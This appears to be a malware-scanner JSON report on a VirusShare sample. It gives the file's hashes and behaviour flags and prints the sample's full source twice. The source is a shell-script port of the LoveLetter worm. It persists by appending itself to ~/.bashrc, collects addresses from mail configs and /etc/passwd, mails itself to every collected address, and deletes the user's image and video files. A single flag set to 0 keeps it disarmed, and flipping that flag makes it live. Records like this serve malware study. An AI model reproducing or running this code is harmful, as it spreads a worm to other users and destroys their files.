{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "mkdir": "May create a directory",
            "open": "May open a file",
            "shell": "May run an executable file or a system command",
            "system": "May run an executable file or a system command on a Mac"
        },
        "macro": "#!/bin/sh\n# This is a demonstration how easy a virus like the LoveLetter virus \n# can be portet to a unix systems. \n#\n# First this \"virus\" searches for the users email adresses in \n# $MAIL_FILES\n# then its extracting the other usernames out of the /etc/passwd file.\n# He creates a shell script for sending the virus to the extracted\n# adresses. Have a look on $MAIL_PROG.\n#\n# Then he is executing this script.\n#\n# The second Part of the virus tries to delete all $DELETE_FILES file.\n# Its useses locate to get the file names.\n# The virus creates a shell script for removing these files. \n# Have a look on $DELETE_PROG. There you can see which files the\n# virus would be able to delete.\n#\n# Then he is executing this script.\n#\n# If the $BE_VIRUS value is set to 0 (false)\n# none of these script will be executed. If its set to 1 (true) both \n# scripts will be executed\n\n\n# 0 is false and 1 is true\n# Be careful! If you set it to 1 it becomes\n# a real virus and can damage your system\n# and infekt many other computers!\nBE_VIRUS=0 \n\nPROG_DIR=~/loveletter\nPROG_BIN_DIR=$PROG_DIR/bin\nPROG_FILES_DIR=$PROG_DIR/files\n\nREADME_FILE=$PROG_DIR/REAMDE\nPROG_LOG_FILE=$PROG_DIR/log\nBIN_PROG=$PROG_BIN_DIR/loveletter.sh\n\nMAIL_FILES=\".muttrc .mailrc\" \nMAIL_PROG=$PROG_BIN_DIR/sendmails.sh\n\nDELETE_FILES=\"*.jpg *.mpg *.mpeg *.gif\"\nDELETE_PROG=$PROG_BIN_DIR/rm.sh\n\n# logging the activties\n# eg.: log \"Sending Mail to Skinny\";\nlog() {\n  echo $*\n  echo $* >> $PROG_LOG_FILE \n}\n\ncreate_directories() { \n  mkdir $PROG_DIR\n  mkdir $PROG_BIN_DIR\n  mkdir $PROG_FILES_DIR\n\n  log \"Creating directory\" $PROG_DIR\n  log \"Creating directory\" $PROG_BIN_DIR\n  log \"Creating directory\" $PROG_FILES_DIR\n}\n\npos_bin() {\n  local pos\n\n  pos=`pwd`\n\n  log \"Copying\" $pos/$0 $PROG_BIN_DIR/loveletter.sh\n  cp $pos/$0 $PROG_BIN_DIR/loveletter.sh\n  chmod 755 $PROG_BIN_DIR/loveletter.sh\n}\n\n# cleans the old loveletter directory\nclean_old_stuff() {\n  rm -rf $PROG_DIR\n}\n\n# hook into the startup process\nhook_into_startup() {\n  local bashrc\n\n  if test $BE_VIRUS -eq 0; then\n    # we are not a virus, we are doing\n    # it on a copy\n    cp ~/.bashrc $PROG_FILES_DIR\n    bashrc=$PROG_FILES_DIR/.bashrc\n  else\n    bashrc=~/.bashrc\n  fi\n\n  if test -f $bashrc; then\n    log \"Adding \\\"\" $BIN_PROG \"& \\\"to \" ~/.bashrc\n    echo $BIN_PROG \"&\" >> $bashrc\n  fi\n}\n\n# extracting email-addresses out of different \n# mail files\nget_adresses() {\n   local f\n   local a\n   local adresses\n\n   log \"Getting email adresses\"\n\n   for f in $MAIL_FILES; do\n     if test -f $f; then\n       a=`perl -e 'open( INFILE, \"'$f'\" );  \n                      foreach( <INFILE> ) {\n                        if( /^alias/i )  {\n                          s/(.*[\\\"\\< ])([\\w\\-\\.]+@[a-zA-Z0-9\\.\\-_]+)(.*$)/$2/;\n                          print \"$_\";\n                        }\n                      }\n                   close( INFILE );'`\n       adresses=\"$adresses $a\"\n     fi\n  done\n\n  # names of other users on the system\n  a=`awk 'BEGIN{ FS=\":\"} { print $1 }' /etc/passwd`\n  adresses=\"$adresses $a\"\n\n  log \"Creating sendmail file\"\n\n  echo \"#!/bin/sh\" >> $MAIL_PROG\n  chmod 755 $MAIL_PROG\n\n  for a in $adresses; do\n    echo 'mailx -s \"I LOVE YOU\" '$a' < '$BIN_PROG >> $MAIL_PROG\n  done\n}\n\nsend_virus() {\n local n \n\n # number of email adresses\n n=`awk 'END{ a=NR-1; print a }' $MAIL_PROG`\n\n log \"Sending Virus to \" $n \"users\"\n\n if test $BE_VIRUS -eq 1; then\n   $MAIL_PROG\n fi\n\n}\n\n\nget_files() {\n  local f \n  local files\n\n  log \"Getting deletable files\"\n\n  for f in $DELETE_FILES; do\n    files=\"$files `locate $f`\"\n  done\n\n  echo \"#!/bin/sh\" >> $DELETE_PROG\n  chmod 755 $DELETE_PROG\n\n  for f in $files; do\n    if test -O $f; then\n      echo \"rm -f $f\" >> $DELETE_PROG\n    else\n     if test -G $f; then\n       echo \"rm -f $f\" >> $DELETE_PROG\n     fi\n    fi   \n  done  \n}\n\ndelete_files() {\n  local n\n  \n  n=`awk 'END{ a=NR-1; print a }' $DELETE_PROG`\n\n  log \"Deleting $n files\" \n  \n  if test $BE_VIRUS -eq 1; then\n    $DELETE_PROG\n  fi \n \n}\n\ncreate_readme() {\n\nlog \"Creating $README_FILE  file\"\n\necho '  \nThis is a demonstration how easy a virus like the LoveLetter virus \ncan be portet to a unix systems. \n\nFirst this \"virus\" searches for the users email adresses in \n'$MAIL_FILES'\nthen its extracting the other usernames out of the /etc/passwd file.\nHe creates a shell script for sending the virus to the extracted\nadresses. Have a look at the '$MAIL_PROG' file.\n\nThen he is executing this script.\n\nThe second Part of the virus tries to delete all '$DELETE_FILES' file.\nIts useses locate to get the file names.\nThe virus creates a shell script for removing these files. \nHave a look on '$DELETE_PROG'. There you can see which files the\nvirus would be able to delete.\n\nThen he is executing this script.\n\nThe BE_VIRUS value is to '$BE_VIRUS', so if its set to 0 (false)\nnone of these script will be executed. If its set to 1 (true) both \nscripts will be executed\n' > $README_FILE\n\n}\n\n# the main program\nclean_old_stuff\n\ncreate_directories\n\ncreate_readme\n\npos_bin\n\nhook_into_startup\n\nget_adresses\n\nsend_virus\n\nget_files\n\ndelete_files\n"
    },
    "filename": "VirusShare_4da9122659573fc2a6aacba4dc10de1e",
    "filesize": 5042,
    "filetype": "POSIX shell script, ASCII text executable",
    "hashes": {
        "md5": "4da9122659573fc2a6aacba4dc10de1e",
        "sha1": "439138a1d0176cd34e55a7b384193a7ff4858cea",
        "sha256": "9a95c762b22f13515921ccae598dd1215fe69b89c16d7076fb6c2c92609740ef"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "#!/bin/sh",
            "# This is a demonstration how easy a virus like the LoveLetter virus ",
            "# can be portet to a unix systems. ",
            "# First this \"virus\" searches for the users email adresses in ",
            "# $MAIL_FILES",
            "# then its extracting the other usernames out of the /etc/passwd file.",
            "# He creates a shell script for sending the virus to the extracted",
            "# adresses. Have a look on $MAIL_PROG.",
            "# Then he is executing this script.",
            "# The second Part of the virus tries to delete all $DELETE_FILES file.",
            "# Its useses locate to get the file names.",
            "# The virus creates a shell script for removing these files. ",
            "# Have a look on $DELETE_PROG. There you can see which files the",
            "# virus would be able to delete.",
            "# Then he is executing this script.",
            "# If the $BE_VIRUS value is set to 0 (false)",
            "# none of these script will be executed. If its set to 1 (true) both ",
            "# scripts will be executed",
            "# 0 is false and 1 is true",
            "# Be careful! If you set it to 1 it becomes",
            "# a real virus and can damage your system",
            "# and infekt many other computers!",
            "BE_VIRUS=0 ",
            "PROG_DIR=~/loveletter",
            "PROG_BIN_DIR=$PROG_DIR/bin",
            "PROG_FILES_DIR=$PROG_DIR/files",
            "README_FILE=$PROG_DIR/REAMDE",
            "PROG_LOG_FILE=$PROG_DIR/log",
            "BIN_PROG=$PROG_BIN_DIR/loveletter.sh",
            "MAIL_FILES=\".muttrc .mailrc\" ",
            "MAIL_PROG=$PROG_BIN_DIR/sendmails.sh",
            "DELETE_FILES=\"*.jpg *.mpg *.mpeg *.gif\"",
            "DELETE_PROG=$PROG_BIN_DIR/rm.sh",
            "# logging the activties",
            "# eg.: log \"Sending Mail to Skinny\";",
            "log() {",
            "  echo $*",
            "  echo $* >> $PROG_LOG_FILE ",
            "create_directories() { ",
            "  mkdir $PROG_DIR",
            "  mkdir $PROG_BIN_DIR",
            "  mkdir $PROG_FILES_DIR",
            "  log \"Creating directory\" $PROG_DIR",
            "  log \"Creating directory\" $PROG_BIN_DIR",
            "  log \"Creating directory\" $PROG_FILES_DIR",
            "pos_bin() {",
            "  local pos",
            "  pos=`pwd`",
            "  log \"Copying\" $pos/$0 $PROG_BIN_DIR/loveletter.sh",
            "  cp $pos/$0 $PROG_BIN_DIR/loveletter.sh",
            "  chmod 755 $PROG_BIN_DIR/loveletter.sh",
            "# cleans the old loveletter directory",
            "clean_old_stuff() {",
            "  rm -rf $PROG_DIR",
            "# hook into the startup process",
            "hook_into_startup() {",
            "  local bashrc",
            "  if test $BE_VIRUS -eq 0; then",
            "    # we are not a virus, we are doing",
            "    # it on a copy",
            "    cp ~/.bashrc $PROG_FILES_DIR",
            "    bashrc=$PROG_FILES_DIR/.bashrc",
            "  else",
            "    bashrc=~/.bashrc",
            "  fi",
            "  if test -f $bashrc; then",
            "    log \"Adding \\\"\" $BIN_PROG \"& \\\"to \" ~/.bashrc",
            "    echo $BIN_PROG \"&\" >> $bashrc",
            "  fi",
            "# extracting email-addresses out of different ",
            "# mail files",
            "get_adresses() {",
            "   local f",
            "   local a",
            "   local adresses",
            "   log \"Getting email adresses\"",
            "   for f in $MAIL_FILES; do",
            "     if test -f $f; then",
            "       a=`perl -e 'open( INFILE, \"'$f'\" );  ",
            "                      foreach( <INFILE> ) {",
            "                        if( /^alias/i )  {",
            "                          s/(.*[\\\"\\< ])([\\w\\-\\.]+@[a-zA-Z0-9\\.\\-_]+)(.*$)/$2/;",
            "                          print \"$_\";",
            "                        }",
            "                      }",
            "                   close( INFILE );'`",
            "       adresses=\"$adresses $a\"",
            "     fi",
            "  done",
            "  # names of other users on the system",
            "  a=`awk 'BEGIN{ FS=\":\"} { print $1 }' /etc/passwd`",
            "  adresses=\"$adresses $a\"",
            "  log \"Creating sendmail file\"",
            "  echo \"#!/bin/sh\" >> $MAIL_PROG",
            "  chmod 755 $MAIL_PROG",
            "  for a in $adresses; do",
            "    echo 'mailx -s \"I LOVE YOU\" '$a' < '$BIN_PROG >> $MAIL_PROG",
            "  done",
            "send_virus() {",
            " local n ",
            " # number of email adresses",
            " n=`awk 'END{ a=NR-1; print a }' $MAIL_PROG`",
            " log \"Sending Virus to \" $n \"users\"",
            " if test $BE_VIRUS -eq 1; then",
            "   $MAIL_PROG",
            "get_files() {",
            "  local f ",
            "  local files",
            "  log \"Getting deletable files\"",
            "  for f in $DELETE_FILES; do",
            "    files=\"$files `locate $f`\"",
            "  done",
            "  echo \"#!/bin/sh\" >> $DELETE_PROG",
            "  chmod 755 $DELETE_PROG",
            "  for f in $files; do",
            "    if test -O $f; then",
            "      echo \"rm -f $f\" >> $DELETE_PROG",
            "    else",
            "     if test -G $f; then",
            "       echo \"rm -f $f\" >> $DELETE_PROG",
            "     fi",
            "    fi   ",
            "  done  ",
            "delete_files() {",
            "  local n",
            "  n=`awk 'END{ a=NR-1; print a }' $DELETE_PROG`",
            "  log \"Deleting $n files\" ",
            "  if test $BE_VIRUS -eq 1; then",
            "    $DELETE_PROG",
            "  fi ",
            "create_readme() {",
            "log \"Creating $README_FILE  file\"",
            "echo '  ",
            "This is a demonstration how easy a virus like the LoveLetter virus ",
            "can be portet to a unix systems. ",
            "First this \"virus\" searches for the users email adresses in ",
            "'$MAIL_FILES'",
            "then its extracting the other usernames out of the /etc/passwd file.",
            "He creates a shell script for sending the virus to the extracted",
            "adresses. Have a look at the '$MAIL_PROG' file.",
            "Then he is executing this script.",
            "The second Part of the virus tries to delete all '$DELETE_FILES' file.",
            "Its useses locate to get the file names.",
            "The virus creates a shell script for removing these files. ",
            "Have a look on '$DELETE_PROG'. There you can see which files the",
            "virus would be able to delete.",
            "Then he is executing this script.",
            "The BE_VIRUS value is to '$BE_VIRUS', so if its set to 0 (false)",
            "none of these script will be executed. If its set to 1 (true) both ",
            "scripts will be executed",
            "' > $README_FILE",
            "# the main program",
            "clean_old_stuff",
            "create_directories",
            "create_readme",
            "pos_bin",
            "hook_into_startup",
            "get_adresses",
            "send_virus",
            "get_files",
            "delete_files"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.300715",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
